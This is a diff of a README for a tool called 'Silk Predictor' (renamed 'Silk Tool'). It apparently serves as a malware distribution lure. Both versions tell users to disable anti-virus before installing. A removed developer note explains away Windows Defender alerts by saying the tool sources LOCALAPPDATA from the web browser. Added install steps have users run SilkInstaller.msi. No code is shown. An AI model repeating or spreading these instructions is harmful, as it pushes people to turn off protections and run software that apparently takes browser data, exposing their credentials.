@@ -3,7 +3,7 @@
   <img src=https://github.com/JAMES-WORK42/silk-predictor/assets/64102856/40d2451d-bc01-4603-a7e9-a0afb25b7651" alt="Silk" />
 </p>
 
-  <h1 align="center">Silk Predictor</h1>
+  <h1 align="center">Silk Tool</h1>
 <p align="center">
   <a href="https://python.org">
     <img src="https://img.shields.io/badge/Python-3.7-green.svg">
@@ -19,24 +19,15 @@
   </a>
 </p>
 
-## It is recommended that you disable any running anti-virus software before install.
+## It is recommended that you disable any running anti-virus software before installation.
 
-A note from the developer:
-
-## Anti-Virus, Windows Defender false detection
-Dear all users,
-
-I hope this message finds you well.  
-
-With the recent release of version 2.0.2, I have noticed that upon installation Chrome as well as Windows Defender will detect suspicious activity.
-
-I would like to assure you that there is no issue. The detection arises due to the updated source code which **requires LOCALAPPDATA to be sourced from your web browser** which will be used to increase the accuracy of the predictor.
-
-Versions 1.9.9 and 2.0.1 will not require the source of LOCALAPPDATA and **will** remain fully functional. Any older versions will be discontinued on August 1st, 2024.
-
-Thank you for your time and consideration - I will update you all as new information arises.
-
-James
+## Express Installation
+You will need to disable any active anti-virus software before installation.  Silk sources information from your web browser which can sometimes result in a false detection.
+1) Download ZIP
+2) Extract all files
+3) Navigate to extracted files
+4) Launch `SilkInstaller.msi`
+5) Follow the steps in the installer.
 
 ## Disclaimer
 <p align="center">
